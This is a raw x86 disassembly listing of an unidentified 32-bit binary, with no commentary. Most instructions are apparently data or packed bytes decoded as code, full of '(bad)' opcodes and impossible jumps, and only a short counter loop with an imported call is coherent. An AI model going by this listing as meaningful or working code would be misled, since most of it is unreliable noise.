  4110b7:	cmp    DWORD PTR [edx-0x41a91add],edx
  4110bd:	retf   
  4110be:	sub    al,BYTE PTR [edx+eiz*4-0x6]
  4110c2:	or     eax,0xa9f87bcf
  4110c7:	aaa    
  4110c8:	sub    ah,dh
  4110ca:	mov    edi,0xb18843f7
  4110cf:	cmp    edi,esp
  4110d1:	fisttp DWORD PTR [ebp+0x1f]
  4110d4:	loopne 0x4110f7
  4110d6:	mov    eax,ds:0x2697d330
  4110db:	dec    edx
  4110dc:	inc    DWORD PTR [ecx+0x5e]
  4110df:	scas   al,BYTE PTR es:[edi]
  4110e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110e1:	aas    
  4110e2:	pop    edx
  4110e3:	jno    0x411151
  4110e5:	cld    
  4110e6:	jp     0x41113b
  4110e8:	pop    ecx
  4110e9:	mov    edi,0x9eca158b
  4110ee:	sub    eax,0xbd890f3e
  4110f3:	sub    BYTE PTR [ecx+0x2acb944],0x3d
  4110fa:	dec    edx
  4110fb:	(bad)  
  4110fc:	xlat   BYTE PTR ds:[ebx]
  4110fd:	cmp    BYTE PTR [edi-0x4f5fb3e8],ah
  411103:	pop    edi
  411104:	and    cl,dh
  411106:	add    eax,DWORD PTR [edi-0x16e04c56]
  41110c:	mov    bh,0xda
  41110e:	lods   al,BYTE PTR ds:[esi]
  41110f:	div    DWORD PTR [ecx]
  411111:	imul   esi,esi,0x8fd5274f
  411117:	fnstenv [eax]
  411119:	fiadd  DWORD PTR [ecx+ebx*4+0x64]
  41111d:	cld    
  41111e:	xchg   edx,eax
  41111f:	ret    0x6643
  411122:	jmp    0x411120
  411124:	jo     0x41116d
  411126:	scas   al,BYTE PTR es:[edi]
  411127:	ins    DWORD PTR es:[edi],dx
  411128:	jbe    0x411104
  41112a:	mov    eax,0x8b8ef1a6
  41112f:	call   0x9bd72c7b
  411134:	pop    eax
  411135:	shl    ebx,0xb9
  411138:	push   cs
  411139:	adc    BYTE PTR [edi+0x4f],ch
  41113c:	call   0x75da:0xecfddbee
  411143:	sbb    DWORD PTR [esi-0xc5b3e2c],ebx
  411149:	jns    0x411120
  41114b:	push   cs
  41114c:	adc    DWORD PTR ds:0x760d3911,0xffffffcd
  411153:	enter  0xdb2c,0xf5
  411157:	sub    cl,cl
  411159:	sub    eax,0xe289a352
  41115e:	jo     0x41113d
  411160:	or     BYTE PTR [ecx-0x4d],0x1d
  411164:	mov    DWORD PTR [ecx-0x3c1a96bb],edx
  41116a:	ds xchg edi,eax
  41116c:	das    
  41116d:	inc    ebx
  41116e:	jp     0x4111e1
  411170:	ins    BYTE PTR es:[edi],dx
  411171:	rol    ebx,1
  411173:	or     BYTE PTR [edi+edi*1+0x61],al
  411177:	xchg   ecx,eax
  411178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411179:	xchg   edi,eax
  41117a:	mov    al,ds:0x134cdfc9
  41117f:	not    DWORD PTR [ebx]
  411181:	sub    BYTE PTR [ecx],dh
  411183:	mov    ebx,0x624a5cfd
  411188:	ret    0xd882
  41118b:	add    cl,BYTE PTR [ebx-0x97ca285]
  411191:	repz pop es
  411193:	test   BYTE PTR [esi],al
  411195:	mov    cl,0x1a
  411197:	(bad)  
  411198:	(bad)  
  411199:	adc    BYTE PTR [edx],dh
  41119b:	nop
  41119c:	push   0x9d0af889
  4111a1:	add    eax,0x87d1999c
  4111a6:	leave  
  4111a7:	lods   eax,DWORD PTR ds:[esi]
  4111a8:	fisubr WORD PTR [ecx]
  4111aa:	sbb    dh,ch
  4111ac:	fwait
  4111ad:	shl    DWORD PTR [edi-0x7a],0x23
  4111b1:	sti    
  4111b2:	mov    ecx,DWORD PTR [ecx+0x3a]
  4111b5:	fild   QWORD PTR [edi+0x255eeb17]
  4111bb:	pop    esp
  4111bc:	jge    0x411184
  4111be:	pop    esi
  4111bf:	xchg   BYTE PTR [esi+0x10c17dc5],cl
  4111c5:	jbe    0x411170
  4111c7:	int3   
  4111c8:	push   0x3e
  4111ca:	sti    
  4111cb:	(bad)  
  4111cc:	aam    0x38
  4111ce:	call   0x1ebd44d
  4111d3:	push   es
  4111d4:	xor    BYTE PTR [edi-0x4e],dl
  4111d7:	push   es
  4111d8:	inc    eax
  4111d9:	shl    DWORD PTR [eax],0x35
  4111dc:	ins    DWORD PTR es:[edi],dx
  4111dd:	repnz add al,0x82
  4111e0:	cs dec edi
  4111e2:	xor    al,0x90
  4111e4:	jp     0x41122e
  4111e6:	shl    BYTE PTR [ebp+0x33],1
  4111e9:	stc    
  4111ea:	or     ebp,0xffffff9f
  4111ed:	les    eax,FWORD PTR [edx]
  4111ef:	call   0x11ca:0x38c5ab75
  4111f6:	add    bh,al
  4111f8:	inc    edx
  4111f9:	push   cs
  4111fa:	push   ds
  4111fb:	add    BYTE PTR [ebp+0x32],0x97
  4111ff:	int3   
  411200:	mov    al,0xb6
  411202:	add    BYTE PTR [edi+ebp*8],0xf8
  411206:	dec    edx
  411207:	add    ecx,DWORD PTR [edx-0x49]
  41120a:	pop    ebp
  41120b:	push   0x2a
  41120d:	jle    0x4111a1
  41120f:	in     al,0x44
  411211:	test   BYTE PTR [ebx-0x4b],bh
  411214:	not    ebp
  411216:	or     al,0xd5
  411218:	sub    BYTE PTR [esi+0x54],ah
  41121b:	push   cs
  41121c:	test   al,0xb1
  41121e:	pop    ss
  41121f:	inc    esi
  411220:	out    dx,al
  411221:	jmp    0x3f880a9d
  411226:	xor    al,0xe6
  411228:	fcomp  DWORD PTR [esp+ebp*8]
  41122b:	int3   
  41122c:	jb     0x411224
  41122e:	pop    edx
  41122f:	imul   ecx,ebp,0x4185f0c6
  411235:	inc    ebp
  411236:	test   BYTE PTR ds:0x2de1dde9,bl
  41123c:	stos   BYTE PTR es:[edi],al
  41123d:	dec    ecx
  41123e:	out    dx,eax
  41123f:	push   eax
  411240:	retf   0xb31
  411243:	imul   eax
  411245:	call   0x8831:0xca7bc0e1
  41124c:	stc    
  41124d:	add    eax,0x146f1000
  411252:	cmp    DWORD PTR [eax-0x80],ebx
  411255:	aas    
  411256:	lock int3 
  411258:	jp     0x4112c1
  41125a:	xor    bl,bh
  41125c:	pop    ecx
  41125d:	aas    
  41125e:	sti    
  41125f:	arpl   WORD PTR [edx+esi*2+0x2c],ax
  411263:	push   ebx
  411264:	mov    edi,0xadcd647c
  411269:	(bad)  
  41126c:	sub    bh,BYTE PTR [esi+eiz*1-0x306ba97d]
  411273:	jno    0x411252
  411275:	aas    
  411276:	cdq    
  411277:	sahf   
  411278:	push   0xffffffc2
  41127a:	add    al,0x3c
  41127c:	out    0xbc,eax
  41127e:	or     al,BYTE PTR [ebp+0x9]
  411281:	fwait
  411282:	or     al,0x8b
  411284:	fwait
  411285:	mov    WORD PTR [ecx-0x3c],ss
  411288:	test   cl,bl
  41128a:	push   0x6f
  41128c:	popf   
  41128d:	imul   esp,DWORD PTR [esi+0x4ed7507],0x9e4f6d59
  411297:	dec    esp
  411298:	mov    ah,0x2
  41129a:	aas    
  41129b:	sub    cl,BYTE PTR [eax]
  41129d:	loopne 0x4112b3
  41129f:	test   al,0xa6
  4112a1:	and    BYTE PTR [ecx-0x5c],dl
  4112a4:	repz pop esp
  4112a6:	push   esp
  4112a7:	jmp    0x411311
  4112a9:	pop    esi
  4112aa:	je     0x411320
  4112ac:	pop    ebp
  4112ad:	call   0x1400:0x860884f2
  4112b4:	mov    WORD PTR [ebx-0x1bec6513],cs
  4112ba:	adc    edx,DWORD PTR [ebx+0x44dc68b7]
  4112c0:	push   eax
  4112c1:	test   eax,0x4a18e27d
  4112c6:	stos   DWORD PTR es:[edi],eax
  4112c7:	ret    
  4112c8:	adc    esp,DWORD PTR [ecx+0x58a27227]
  4112ce:	cmp    BYTE PTR [ebp+edi*2+0x5227c99d],dh
  4112d5:	mov    es,WORD PTR [edi+edx*2]
  4112d8:	xor    BYTE PTR [eax+0x2e800e9],dh
  4112de:	or     al,0x97
  4112e0:	dec    ebx
  4112e1:	in     eax,0xb0
  4112e3:	mov    WORD PTR [edx+eax*1-0x73480d91],?
  4112ea:	test   BYTE PTR [edi],dh
  4112ec:	imul   edx,DWORD PTR [ebx-0x42],0xffffffc9
  4112f0:	mov    edx,0x82442fbe
  4112f5:	pop    ebx
  4112f6:	push   0xffffffce
  4112f8:	xor    ax,0x4ae6
  4112fc:	pop    edi
  4112fd:	jnp    0x411354
  4112ff:	dec    edx
  411300:	outs   dx,BYTE PTR ds:[esi]
  411301:	push   es
  411302:	jno    0x4112a9
  411304:	stos   DWORD PTR es:[edi],eax
  411305:	push   edx
  411306:	inc    ecx
  411307:	mov    eax,ds:0xde52d877
  41130c:	mov    ebx,0xfce729ec
  411311:	sbb    bh,BYTE PTR [ecx-0x1bd1a67a]
  411317:	adc    ah,cl
  411319:	mov    WORD PTR [ecx+0x38],gs
  41131c:	ret    0x29dd
  41131f:	push   ds
  411320:	mov    gs,WORD PTR ds:[eax]
  411323:	or     edx,ecx
  411325:	jl     0x41131f
  411327:	stos   BYTE PTR es:[edi],al
  411328:	jmp    0x411371
  41132a:	add    dl,BYTE PTR [esi]
  41132c:	retf   0x462
  41132f:	jge    0x411342
  411331:	out    0xf4,al
  411333:	dec    ebp
  411334:	sub    edi,DWORD PTR [edi+0x7c470973]
  41133a:	add    BYTE PTR [edi+0x4],0x1b
  41133e:	cmp    edx,DWORD PTR [ebx+0x6cd2a74]
  411344:	in     al,0x1b
  411346:	ror    BYTE PTR [eax+edx*1-0x45],cl
  41134a:	repnz test bl,ah
  41134d:	popf   
  41134e:	push   0xffffffe2
  411350:	mov    ebx,DWORD PTR [edi-0x7f6bfd23]
  411356:	mov    ch,BYTE PTR [esi-0x45f5e204]
  41135c:	loopne 0x41131c
  41135e:	jmp    0x9efee908
  411363:	xchg   ebp,eax
  411364:	adc    BYTE PTR [esi+0x7073198e],ah
  41136a:	mov    ebx,0xf1b4702
  41136f:	or     al,0x96
  411371:	xlat   BYTE PTR ds:[ebx]
  411372:	in     al,dx
  411373:	add    BYTE PTR [ebx+0x16a5aaab],al
  411379:	les    edx,FWORD PTR [edi]
  41137b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41137c:	in     eax,dx
  41137d:	fmul   QWORD PTR [edx-0x20]
  411380:	jmp    0x47327d0a
  411385:	inc    ebx
  411386:	cmp    al,0x4d
  411388:	(bad)  
  411389:	(bad)  
  41138a:	je     0x411378
  41138c:	pop    esp
  41138d:	sbb    BYTE PTR es:[ebx-0x4c],0x24
  411392:	pusha  
  411393:	and    BYTE PTR [ebx],dl
  411395:	test   BYTE PTR [esi+edi*1+0x69],0x1d
  41139a:	sbb    ebp,0xa350d153
  4113a0:	mov    ah,0x9f
  4113a2:	dec    edi
  4113a3:	and    al,0x97
  4113a5:	cmp    bl,ah
  4113a7:	repnz leave 
  4113a9:	and    ecx,DWORD PTR [ebx]
  4113ab:	mov    ah,0xf4
  4113ad:	adc    BYTE PTR [ecx+0x4a65bb16],bl
  4113b3:	jno    0x4113b6
  4113b5:	mov    al,ds:0x54bca687
  4113ba:	add    ah,BYTE PTR [eax-0x25]
  4113bd:	mov    edx,0xd8f07966
  4113c2:	and    eax,0xc7c63b91
  4113c7:	add    eax,0x42fcf1
  4113cc:	in     al,0x78
  4113ce:	add    BYTE PTR [eax],al
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	mov    esp,0xe2556eb
  41144c:	dec    edx
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x4113dd
  411454:	jmp    0xbb65:0x88664bd0
  41145b:	adc    DWORD PTR [edi-0x23],edi
  41145e:	loop   0x411471
  411460:	repz (bad) 
  411463:	pop    eax
  411464:	jae    0x411423
  411466:	inc    esp
  411467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411468:	shl    edi,0x2a
  41146b:	int3   
  41146c:	aaa    
  41146d:	jmp    0x6cee:0x4ceb2cdd
  411474:	js     0x4114d0
  411476:	mov    esi,0x4184b45b
  41147b:	xor    al,0x9b
  41147d:	or     eax,0xce8b8221
  411482:	mov    bh,BYTE PTR [eax]
  411484:	jp     0x4114bb
  411486:	pop    edx
  411487:	adc    eax,0xeee62323
  41148c:	pop    ss
  41148d:	dec    edx
  41148e:	in     eax,0xcc
  411490:	push   0xffffff8c
  411492:	test   al,0x72
  411494:	rcr    DWORD PTR [eax],1
  411496:	jb     0x411418
  411498:	scas   eax,DWORD PTR es:[edi]
  411499:	inc    esi
  41149a:	mov    esp,edi
  41149c:	popa   
  41149d:	loop   0x411471
  41149f:	daa    
  4114a0:	int    0x88
  4114a2:	jp     0x411520
  4114a4:	repz enter 0xc867,0xb5
  4114a9:	adc    eax,0xb96a99a1
  4114ae:	je     0x41147b
  4114b0:	(bad)  
  4114b1:	jmp    0x27a4:0xa0334df
  4114b8:	outs   dx,BYTE PTR ds:[esi]
  4114b9:	lds    esi,FWORD PTR [ecx-0x33ac75f0]
  4114bf:	sbb    eax,0x28317d31
  4114c4:	bound  esi,QWORD PTR [edi]
  4114c6:	(bad)  
  4114c7:	outs   dx,DWORD PTR ds:[esi]
  4114c8:	ror    BYTE PTR [edi+0x45],1
  4114cb:	add    al,0xbc
  4114cd:	lods   eax,DWORD PTR ds:[esi]
  4114ce:	xor    DWORD PTR [eax],0x3c
  4114d1:	sub    DWORD PTR [edi+0x1e],edx
  4114d4:	daa    
  4114d5:	in     al,dx
  4114d6:	pop    edx
  4114d7:	mov    cl,0xcc
  4114d9:	xchg   edi,eax
  4114da:	jmp    0x7d80:0xcc9e6c4e
  4114e1:	fild   QWORD PTR [edi-0x33]
  4114e4:	add    BYTE PTR [ecx],0x79
  4114e7:	into   
  4114e8:	repz push ebx
  4114ea:	ins    BYTE PTR es:[edi],dx
  4114eb:	inc    edi
  4114ec:	lods   eax,DWORD PTR ds:[esi]
  4114ed:	and    eax,0x4b175b38
  4114f2:	jbe    0x4114a1
  4114f4:	jl     0x411483
  4114f6:	loop   0x4114dc
  4114f8:	inc    ebp
  4114f9:	pop    es
  4114fa:	sub    ah,BYTE PTR [ebx-0x35bcdd4c]
  411500:	js     0x411532
  411502:	fstp   TBYTE PTR [edx]
  411504:	je     0x4114a6
  411506:	iret   
  411507:	hlt    
  411508:	pop    esi
  411509:	xor    eax,0xb9c6e5d5
  41150e:	jb     0x411550
  411510:	out    dx,al
  411511:	pop    ebp
  411512:	js     0x411589
  411514:	sbb    DWORD PTR [ebx],edx
  411516:	xchg   DWORD PTR [ecx-0x1230f97d],edx
  41151c:	inc    ebp
  41151d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41151e:	inc    edx
  41151f:	leave  
  411520:	jbe    0x4114a6
  411522:	ins    BYTE PTR es:[edi],dx
  411523:	lods   eax,DWORD PTR ds:[esi]
  411524:	in     al,dx
  411525:	lock cli 
  411527:	mov    al,0x0
  411529:	dec    eax
  41152a:	hlt    
  41152b:	rcr    DWORD PTR [edi-0x7c],1
  41152e:	jno    0x411580
  411530:	pop    ss
  411531:	fsub   QWORD PTR [edi+0x6d8401bc]
  411537:	jno    0x4114e9
  411539:	stos   BYTE PTR es:[edi],al
  41153a:	out    0xe7,al
  41153c:	out    0x71,eax
  41153e:	push   ebx
  41153f:	xor    eax,0xf52fecb1
  411544:	jp     0x41152f
  411546:	and    eax,0x4a2ce2ce
  41154b:	arpl   WORD PTR [eax+0x178c8eb6],cx
  411551:	push   eax
  411552:	jl     0x411525
  411554:	enter  0x616d,0xf3
  411558:	sbb    BYTE PTR [edi],dh
  41155a:	cmp    BYTE PTR [ebp+0x15dbddbb],bh
  411560:	mov    bh,0x4a
  411562:	jle    0x4115a6
  411564:	or     eax,0x87a0a79a
  411569:	adc    BYTE PTR [edx-0x64],0x1f
  41156d:	adc    dh,BYTE PTR [ebp+0x563daa5f]
  411573:	dec    esp
  411574:	into   
  411575:	xchg   ebp,eax
  411576:	sbb    BYTE PTR [ebp+0x20],dl
  411579:	push   ebx
  41157a:	inc    eax
  41157b:	fbld   TBYTE PTR [ebp-0x5f]
  41157e:	ja     0x41155b
  411580:	retf   0x7e9d
  411583:	bound  edx,QWORD PTR [ebx+0x71]
  411586:	inc    edi
  411587:	pop    ecx
  411588:	jle    0x4115fd
  41158a:	(bad)  
  41158b:	hlt    
  41158c:	lds    edi,FWORD PTR [edi+0x311df06d]
  411592:	outs   dx,BYTE PTR ds:[esi]
  411593:	pop    edx
  411594:	push   ecx
  411595:	push   cs
  411596:	retf   0xb662
  411599:	pop    ebp
  41159a:	and    bl,BYTE PTR [esi-0x27]
  41159d:	adc    ah,BYTE PTR [esi+0x4]
  4115a0:	leave  
  4115a1:	mov    al,0x27
  4115a3:	mov    ?,WORD PTR [edx+0x26]
  4115a6:	idiv   BYTE PTR [eax]
  4115a8:	fwait
  4115a9:	mov    ch,0xf0
  4115ab:	aad    0x6b
  4115ad:	scas   eax,DWORD PTR es:[edi]
  4115ae:	loopne 0x4115ec
  4115b0:	div    DWORD PTR ds:0x83a79df1
  4115b6:	int    0x53
  4115b8:	xchg   DWORD PTR [esp+eax*2+0x74],esi
  4115bc:	jmp    0x108e2c28
  4115c1:	je     0x411584
  4115c3:	jp     0x411641
  4115c5:	ins    DWORD PTR es:[edi],dx
  4115c6:	xor    DWORD PTR [ebp+0x14],0x7aab191c
  4115cd:	popa   
  4115ce:	enter  0xceab,0x57
  4115d2:	and    BYTE PTR [esi-0x5a],0x3f
  4115d6:	rcl    DWORD PTR gs:[ebx+0x65],0x64
  4115db:	jge    0x411635
  4115dd:	adc    al,BYTE PTR [esi]
  4115df:	adc    al,0x7e
  4115e1:	shr    edx,cl
  4115e3:	xchg   ecx,eax
  4115e4:	retf   
  4115e5:	mov    al,ds:0x23ec6de4
  4115ea:	cli    
  4115eb:	call   0x7f9c:0xe17dde1a
  4115f2:	or     eax,0x3c60358e
  4115f7:	dec    esi
  4115f8:	ja     0x41166b
  4115fa:	or     ax,0x7b38
  4115fe:	lods   al,BYTE PTR ds:[esi]
  4115ff:	into   
  411600:	or     BYTE PTR [ecx-0x45],cl
  411603:	cli    
  411604:	cld    
  411605:	in     eax,dx
  411606:	push   edi
  411607:	test   dh,dh
  411609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41160a:	cmp    al,0xb7
  41160c:	int3   
  41160d:	mov    ds:0xb7b57ab,al
  411612:	pushf  
  411613:	xchg   edx,eax
  411614:	(bad)  
  411615:	and    al,0x5
  411617:	inc    ecx
  411618:	int3   
  411619:	push   0x2a
  41161b:	scas   al,BYTE PTR es:[edi]
  41161c:	mov    cr1,esp
  41161f:	pop    esp
  411620:	inc    ebp
  411621:	or     DWORD PTR [esi-0xf],0x967730a2
  411628:	add    ebx,DWORD PTR [ebx]
  41162a:	and    edi,DWORD PTR [ecx]
  41162c:	and    eax,0xf3c84005
  411631:	(bad)  
  411632:	cmp    ebx,eax
  411634:	and    BYTE PTR [ebp-0x7101b342],ch
  41163a:	sub    DWORD PTR [ebx+0x60a0addc],0x75
  411641:	or     ebp,ebp
  411643:	daa    
  411644:	xor    DWORD PTR [ebp+0x436a36a6],edx
  41164a:	ja     0x411637
  41164c:	repnz pop ecx
  41164e:	push   cs
  41164f:	inc    eax
  411650:	add    al,0x21
  411652:	in     al,0xf9
  411654:	loopne 0x411650
  411656:	or     bl,al
  411658:	dec    edi
  411659:	dec    eax
  41165a:	mul    BYTE PTR [ebp+0x2c]
  41165d:	jmp    0x41167f
  41165f:	imul   sp,WORD PTR [ebx+edx*1-0x53b2f2e0],0xed5e
  411669:	mov    esi,0xb703ee0c
  41166e:	(bad)  
  41166f:	sub    DWORD PTR [esp+esi*2-0x1005383a],ecx
  411676:	jne    0x41163f
  411678:	test   BYTE PTR [edi+eax*2+0x11],ah
  41167c:	pop    ebp
  41167d:	mov    ch,0x94
  41167f:	shl    bl,1
  411681:	xchg   esp,eax
  411682:	mov    dh,0x1e
  411684:	mov    al,0xd0
  411686:	mov    edx,0x9e6d97fd
  41168b:	dec    ebx
  41168c:	or     BYTE PTR [ebp+0x5a],bl
  41168f:	adc    al,0xdd
  411691:	cwde   
  411692:	fistp  DWORD PTR [eax+0x26]
  411695:	pop    ecx
  411696:	push   ecx
  411697:	into   
  411698:	and    DWORD PTR [esi+0x4f1b7a62],esp
  41169e:	(bad)  
  41169f:	sbb    al,0x8b
  4116a1:	mov    ebx,0xa4e759d
  4116a6:	fld    st(3)
  4116a8:	xor    edi,DWORD PTR [ecx+0x5b8c50d6]
  4116ae:	out    0x9a,al
  4116b0:	mov    BYTE PTR [ebp+0x52c57bd8],bh
  4116b6:	push   0x7f
  4116b8:	and    dh,BYTE PTR [eax]
  4116ba:	mov    WORD PTR [ebp+0x30],?
  4116bd:	mov    ds:0xed0b443,eax
  4116c2:	pop    ecx
  4116c3:	dec    esi
  4116c4:	fild   WORD PTR ds:0xf6fa874
  4116ca:	in     al,0xe6
  4116cc:	lods   eax,DWORD PTR ds:[esi]
  4116cd:	or     BYTE PTR [ebx],0x52
  4116d0:	jecxz  0x4116fd
  4116d2:	cmc    
  4116d3:	mov    ecx,0x2225f9c
  4116d8:	out    0x85,al
  4116da:	xchg   ecx,eax
  4116db:	sbb    ecx,edx
  4116dd:	std    
  4116de:	out    dx,al
  4116df:	adc    bl,BYTE PTR [edi+edi*2+0x55]
  4116e3:	and    bl,ch
  4116e5:	test   al,0x7a
  4116e7:	jo     0x411751
  4116e9:	pop    edx
  4116ea:	mov    ds,WORD PTR [esi+0x8fe17ac]
  4116f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116f2:	mov    esi,0xe4be7ef1
  4116f7:	shl    DWORD PTR [ebp-0x31],1
  4116fa:	xor    DWORD PTR [esp+edx*4-0x681510a1],esi
  411701:	dec    esi
  411702:	jno    0x41169b
  411704:	lea    edx,[esi]
  411706:	in     al,0xa1
  411708:	dec    ebp
  411709:	pushf  
  41170a:	mov    ah,0x6b
  41170c:	push   edi
  41170d:	mov    ecx,0x6cbc7701
  411712:	pushf  
  411713:	enter  0xc5f3,0xdc
  411717:	pop    es
  411718:	inc    esp
  411719:	fcmovbe st,st(3)
  41171b:	mov    cl,0x7c
  41171d:	lock test BYTE PTR [edx-0xe66dff3],cl
  411724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411725:	push   eax
  411726:	leave  
  411727:	leave  
  411728:	mov    ah,BYTE PTR [edi]
  41172a:	jp     0x41174b
  41172c:	stos   BYTE PTR es:[edi],al
  41172d:	add    BYTE PTR [ebp-0x3086647b],bl
  411733:	inc    esi
  411734:	xchg   esp,eax
  411735:	lahf   
  411736:	bound  esi,QWORD PTR [ebx+0x58]
  411739:	loopne 0x411765
  41173b:	mov    eax,0xe49f0816
  411740:	jle    0x411796
  411742:	jae    0x411774
  411744:	test   edi,esi
  411746:	lock push ebx
  411748:	inc    edx
  411749:	std    
  41174a:	shl    DWORD PTR [esi],0x7d
  41174d:	add    dl,BYTE PTR [ebp+0x24]
  411750:	fisttp QWORD PTR [esi+0x5]
  411753:	fcmovu st,st(1)
  411755:	dec    edx
  411756:	and    BYTE PTR [edi],dl
  411758:	pop    esp
  411759:	shl    ah,cl
  41175b:	add    esp,DWORD PTR [eax+0x12256779]
  411761:	push   edi
  411762:	inc    esi
  411763:	add    DWORD PTR [ecx+0x37],edx
  411766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411767:	and    esp,0x2
  41176a:	inc    eax
  41176b:	jne    0x411780
  41176d:	leave  
  41176e:	scas   al,BYTE PTR es:[edi]
  41176f:	repz sti 
  411771:	fiadd  DWORD PTR [ebx]
  411773:	adc    eax,0x17cd2954
  411778:	xor    ecx,DWORD PTR [eax-0x396a02a4]
  41177e:	mov    ebp,0xd86691ce
  411783:	test   eax,0x6e0d7df5
  411788:	aam    0x51
  41178a:	test   DWORD PTR ds:0x1009ea8e,esi
  411790:	(bad)  
  411791:	pusha  
  411792:	loope  0x4117e7
  411794:	add    al,0x2f
  411796:	int    0x9
  411798:	cmp    ebp,ebx
  41179a:	in     al,0x6e
  41179c:	jg     0x411741
  41179e:	push   edx
  41179f:	cs inc ecx
  4117a1:	inc    BYTE PTR [esi-0x2dfa01d6]
  4117a7:	addr16 mov esp,0x986e1812
  4117ad:	or     al,0xf8
  4117af:	xor    bh,BYTE PTR fs:[edi-0x9]
  4117b3:	loop   0x41179f
  4117b5:	retf   
  4117b6:	int    0xe1
  4117b8:	(bad)  
  4117b9:	stos   BYTE PTR es:[edi],al
  4117ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117bb:	or     bl,BYTE PTR [esi+edx*8-0x42c4ec1f]
  4117c2:	push   esp
  4117c3:	repnz xor al,0x24
  4117c6:	aad    0xad
  4117c8:	and    BYTE PTR [ebx],0xf
  4117cb:	das    
  4117cc:	test   BYTE PTR [eax+0x6c],bh
  4117cf:	mov    ds:0xc3086a50,eax
  4117d4:	push   ebp
  4117d5:	push   ss
  4117d6:	mul    bl
  4117d8:	out    dx,al
  4117d9:	adc    al,0xa
  4117db:	xchg   esi,eax
  4117dc:	leave  
  4117dd:	jmp    0x3d06:0x63bcc8e2
  4117e4:	pop    ebx
  4117e5:	lea    edi,[ebx+0x66]
  4117e8:	mov    dh,0x89
  4117ea:	cdq    
  4117eb:	add    ecx,DWORD PTR ds:0x561a8541
  4117f1:	(bad)  
  4117f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117f4:	xor    al,0xc6
  4117f6:	jae    0x4117b5
  4117f8:	sahf   
  4117f9:	in     al,dx
  4117fa:	test   BYTE PTR [esi],dl
  4117fc:	inc    edx
  4117fd:	adc    esp,DWORD PTR [ebx]
  4117ff:	jo     0x41181f
  411801:	push   ds
  411802:	mov    dl,0x5c
  411804:	clc    
  411805:	loope  0x4117a6
  411807:	sub    BYTE PTR [eax+edx*1-0x52],0xcc
  41180c:	ds mov edx,0xa274344c
  411812:	jmp    0x8fcde577
  411817:	clc    
  411818:	retf   0x6c5b
  41181b:	push   ebx
  41181c:	sar    edi,1
  41181e:	dec    edx
  41181f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411820:	pop    ecx
  411821:	(bad)  
  411822:	lods   eax,DWORD PTR ds:[esi]
  411823:	out    dx,al
  411824:	and    al,0x23
  411826:	mov    al,0xdc
  411828:	add    esp,esi
  41182a:	mov    bh,0x59
  41182c:	clc    
  41182d:	add    esi,ebx
  41182f:	mov    al,0x7e
  411831:	sub    ebx,edi
  411833:	lds    esi,FWORD PTR [ebp+0x4292d5fb]
  411839:	dec    ebp
  41183a:	mov    edi,0x2b0c758b
  41183f:	ret    0x581
  411842:	cmc    
  411843:	cld    
  411844:	inc    edx
  411845:	add    BYTE PTR [edi],bh
  411847:	jg     0x411849
  411849:	add    BYTE PTR [ebx],dh
  41184b:	rol    edi,0x5
  41184e:	jp     0x41184d
  411850:	inc    edx
  411851:	add    BYTE PTR [ecx+0x57],dh
  411854:	add    BYTE PTR [eax],al
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx-0x2284de17],dl
  41187c:	or     eax,0x70705776
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x4118ad
  411886:	jb     0x4118aa
  411888:	ror    BYTE PTR [edx-0x4e978ea9],cl
  41188e:	mov    dl,0x22
  411890:	or     DWORD PTR ds:[edx+edx*2],edi
  411894:	jno    0x41182d
  411896:	fadd   DWORD PTR [ebx+esi*1+0x3f4aaf00]
  41189d:	inc    eax
  41189e:	pop    edx
  41189f:	std    
  4118a0:	or     ah,dl
  4118a2:	aas    
  4118a3:	push   esi
  4118a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118a5:	and    al,0xc3
  4118a7:	std    
  4118a8:	xchg   ebx,eax
  4118a9:	jmp    0x411877
  4118ab:	cmp    cl,ch
  4118ad:	sahf   
  4118ae:	xchg   DWORD PTR [esi+0x2d38f002],ebp
  4118b4:	pop    es
  4118b5:	jecxz  0x41185a
  4118b7:	aam    0xec
  4118b9:	push   es
  4118ba:	cmp    al,0x4d
  4118bd:	imul   edi,DWORD PTR [edi-0x38e1c09],0x3e5e142b
  4118c7:	add    esi,edi
  4118c9:	pop    edi
  4118ca:	leave  
  4118cb:	fwait
  4118cc:	sbb    BYTE PTR [ebx],0xa2
  4118cf:	xor    BYTE PTR [esi],dl
  4118d1:	add    eax,0x36688ea0
